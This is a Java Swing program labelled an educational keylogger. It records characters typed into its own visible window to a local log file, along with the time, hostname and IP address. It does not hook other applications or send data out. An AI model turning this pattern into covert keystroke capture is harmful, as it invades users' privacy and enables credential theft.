package keylogger;

import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import javax.swing.JFrame;
import java.net.InetAddress;
import java.net.UnknownHostException;

/**
 *
 * @author Luiz Ritter
 */
public class keyloggertwo extends JFrame implements KeyListener {

    private boolean primeiraVez = true;

    public keyloggertwo() {
        setTitle("keylogger educacional");
        setSize(400, 200);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        addKeyListener(this);
        setVisible(true);
    }

    @Override
    public void keyTyped(KeyEvent e) {
        salvarLog(e.getKeyChar());
    }

    @Override
    public void keyPressed(KeyEvent e) {}

    @Override
    public void keyReleased(KeyEvent e) {} 
    private void salvarLog(char c) {
        try (FileWriter fw = new FileWriter("logs.txt", true)) {
            if (primeiraVez) {
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm");
                String ipAddress = "Desconhecido";
                String hostName = "Desconhecido";
                try {
                    InetAddress localhost = InetAddress.getLocalHost();
                    ipAddress = localhost.getHostAddress();
                    hostName = localhost.getHostName();
                } catch (UnknownHostException ex) {
                    System.err.println("error, rede local não reconhecida: " + ex.getMessage());
                }

                fw.write("\n\n####################################################\n");
                fw.write("LOGS: " + LocalDateTime.now().format(formatter) + "\n");
                fw.write("Máquina Local: " + hostName + " (IP: " + ipAddress + ")\n");
                fw.write("####################################################\n\n");
                primeiraVez = false;
            }

            if (c == KeyEvent.VK_SPACE || c == ' ') {
                fw.write(" ");
            } else if (c == '\n' || c == '\r') {
                fw.write(System.lineSeparator());
            } else {
                fw.write(c);
            }
        } catch (IOException e) {
            System.out.println("Erro ao salvar log: " + e.getMessage());
        }
    }

    public static void main(String[] args) {
        new keyloggertwo();
    }
}